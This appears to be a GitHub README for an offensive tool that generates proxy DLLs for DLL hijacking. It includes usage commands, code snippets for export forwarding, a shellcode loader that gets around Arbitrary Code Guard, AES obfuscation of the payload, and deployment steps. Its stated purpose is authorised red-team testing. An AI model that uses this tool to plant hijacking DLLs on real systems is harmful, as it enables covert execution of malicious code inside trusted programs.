# proxydllgenerator

A Python tool that automates building proxy DLLs for DLL hijacking.  
Given a DLL and a raw shellcode payload, it generates a replacement DLL that:

- **Forwards** every named export to the real DLL via runtime `LoadLibrary` + assembly JMP stubs — no rename of the original required.
- **Executes** the shellcode in a dedicated thread spawned from `DllMain` on `DLL_PROCESS_ATTACH`.
- **Optionally encrypts** the embedded shellcode with AES-CBC, decrypted at runtime using the Windows BCrypt API.

Compilation is performed by **MinGW-w64 cross-compilers**, so the tool works on Linux, macOS, and Windows regardless of host architecture.

---

## Prerequisites

### Python 3.9+

```bash
pip install -r requirements.txt
```

| Package | Purpose |
|---------|---------|
| `pefile >= 2023.2.7` | Parse PE export directories |
| `pycryptodome >= 3.18.0` | AES-CBC shellcode encryption (only needed when using `--encrypt` or `--aes-key`) |

### MinGW-w64 cross-compilers

| Target | Binary required |
|--------|----------------|
| AMD x64 | `x86_64-w64-mingw32-gcc` |
| AMD x86 | `i686-w64-mingw32-gcc` |

**Ubuntu / Debian**
```bash
sudo apt-get install mingw-w64
```

**Fedora / RHEL**
```bash
sudo dnf install mingw64-gcc mingw32-gcc
```

**Arch Linux**
```bash
sudo pacman -S mingw-w64-gcc
```

**macOS**
```bash
brew install mingw-w64
```

**Windows (MSYS2)**
```bash
pacman -S mingw-w64-x86_64-gcc mingw-w64-i686-gcc
```
Add `C:\msys64\mingw64\bin` and `C:\msys64\mingw32\bin` to `PATH`.

---

## Installation

```bash
git clone https://github.com/maskop9/proxydllgenerator
cd proxydllgenerator
pip install -r requirements.txt
```

---

## Usage

```
python proxydll.py -dll <DLL_PATH> -shellcode <SHELLCODE_PATH> [options]
```

### Required

| Argument | Description |
|----------|-------------|
| `-dll <path>` | Path to the DLL to proxy (used to parse exports) |
| `-shellcode <path>` | Path to a raw binary shellcode file (plain or pre-encrypted) |

### Optional

| Argument | Default | Description |
|----------|---------|-------------|
| `-arch x64\|x86\|all` | `all` | Target architecture(s) |
| `-o / --output <name>` | Same as input DLL | Output filename (no extension) |
| `--output-dir <dir>` | `./output` | Root directory for compiled DLLs |
| `--keep-sources` | off | Keep generated `dllmain.c`, `stubs.s`, `proxy.def` |
| `-v / --verbose` | off | Print compiler commands and diagnostics |

### AES encryption

| Argument | Description |
|----------|-------------|
| `--encrypt` | Encrypt the shellcode with a randomly generated AES-256-CBC key and IV |
| `--aes-bits 128\|192\|256` | Key size when using `--encrypt` (default: `256`) |
| `--aes-key <hex>` | Hex-encoded key for a **pre-encrypted** shellcode file (must pair with `--aes-iv`) |
| `--aes-iv <hex>` | Hex-encoded IV for a **pre-encrypted** shellcode file (must pair with `--aes-key`) |

`--encrypt` and `--aes-key` / `--aes-iv` are mutually exclusive — use one mode or the other.

When `--encrypt` is used, the tool prints the generated key and IV to stdout:

```
[+]   Key (hex) : 3f8a1b...
[+]   IV  (hex) : c72d09...
```

---

## Examples

```bash
# Both architectures, no encryption (default)
python proxydll.py -dll secur32.dll -shellcode payload.bin

# Auto-encrypt with a random AES-256 key
python proxydll.py -dll secur32.dll -shellcode payload.bin --encrypt

# Auto-encrypt with AES-128
python proxydll.py -dll secur32.dll -shellcode payload.bin --encrypt --aes-bits 128

# Shellcode is already AES-256-CBC encrypted — supply key and IV in hex
python proxydll.py -dll secur32.dll -shellcode payload.enc \
    --aes-key <64-hex-chars> --aes-iv <32-hex-chars>

# x64 only, custom output name
python proxydll.py -dll secur32.dll -shellcode payload.bin -arch x64 -o secur32

# Inspect generated sources
python proxydll.py -dll version.dll -shellcode shell.bin --keep-sources -v
```

---

## Output structure

```
output/
└── AMD/
    ├── x64/
    │   └── <name>.dll
    └── x86/
        └── <name>.dll
```

With `--keep-sources`:
```
output/_sources/
├── x64/
│   ├── dllmain.c
│   ├── stubs.s
│   └── proxy.def
└── x86/
    └── ...
```

---

## How it works

### Export forwarding

For each named export, `DllMain` loads the real DLL from `System32` using its full path:

```c
char path[MAX_PATH];
GetSystemDirectoryA(path, MAX_PATH);
lstrcatA(path, "\\secur32.dll");
HMODULE orig = LoadLibraryA(path);
```

Using the full `System32` path avoids accidentally loading the proxy itself when it sits in a higher-priority search directory.

Each export is forwarded through a generated assembly JMP stub:

```asm
AcceptSecurityContext:
    jmpq *proxy_fns+0(%rip)   ; x64
```

The `proxy_fns[]` array is filled with `GetProcAddress` pointers at load time. All arguments, registers, and return values pass through untouched.

### Shellcode execution

On load, the proxy spawns a thread that:

1. **Decrypts the shellcode** (if encryption was used) via the Windows BCrypt API.
2. Tries `NtCreateSection` / `NtMapViewOfSection` — section-backed executable memory bypasses `ProcessDynamicCodePolicy` (ACG / Arbitrary Code Guard).
3. Falls back to `VirtualAlloc(PAGE_EXECUTE_READWRITE)` for targets without ACG.

When AES encryption is enabled, shellcode bytes are stored as ciphertext in `.rdata`. The AES key and IV are also embedded in the binary. At runtime, BCrypt decrypts into a heap buffer, copies it to executable memory, then immediately zeroes the heap copy with `SecureZeroMemory` — minimising key-material exposure.

### AES-CBC decryption (encrypted builds only)

The generated C code uses the Windows **BCrypt** API (no third-party DLL required on the target):

```
BCryptOpenAlgorithmProvider  →  BCRYPT_AES_ALGORITHM
BCryptSetProperty            →  BCRYPT_CHAIN_MODE_CBC
BCryptGenerateSymmetricKey   →  key bytes embedded in .rdata
BCryptDecrypt                →  BCRYPT_BLOCK_PADDING (removes PKCS7 padding)
```

`-lbcrypt` is added to the linker command automatically when encryption is active.

### Ordinal-only exports

Exports with no name are skipped with a warning. Most Windows system DLLs export everything by name.

---

## Deployment

1. Drop the generated proxy DLL into a directory searched **before** System32 — typically the target application's own folder.
2. The proxy loads the real DLL straight from `System32` at runtime.

```bash
python proxydll.py -dll secur32.dll -shellcode payload.bin --encrypt
# → output/AMD/x64/secur32.dll
# → output/AMD/x86/secur32.dll
```

---

## Limitations

- **System DLLs only** — the `System32` fallback only helps DLLs that live there. For application-bundled DLLs not in `System32`, deploy the proxy alongside the target and ensure the search order puts it first.
- **ARM not supported** — requires `llvm-mingw`. Add ARM `ArchConfig` entries in `src/compiler.py` if needed.
- **Ordinal-only exports are skipped** — see above.
- **Shellcode must be position-independent (PIC)** — memory is allocated at a random base address.
- **AES key embedded in binary** — the key and IV live in the compiled DLL's `.rdata` section. This is an obfuscation layer, not cryptographic protection against someone who can read the DLL.

---

## Legal notice

This tool is intended for authorised security testing, penetration testing engagements, red-team exercises, and educational purposes only. Use on systems you do not own or have explicit written permission to test is illegal. The authors accept no liability for misuse.
